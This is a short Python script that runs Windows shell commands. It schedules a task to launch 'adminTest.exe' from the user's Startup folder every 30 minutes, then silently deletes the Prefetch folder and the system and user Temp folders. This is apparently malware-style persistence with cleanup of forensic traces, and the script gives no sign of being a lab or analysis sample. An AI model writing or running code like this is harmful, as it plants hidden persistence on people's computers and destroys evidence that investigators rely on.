import os

os.system(r"schtasks /f /create /tn temps_ /sc minute /mo 30 /tr C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\adminTest.exe")
os.system(r"del /s /f /q C:\Windows\Prefetch\*.* > Nul 2>&1")
os.system(r"del /s /f /q C:\Windows\Temp\*.* > Nul 2>&1")
os.system(r"del /s /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*.* > Nul 2>&1")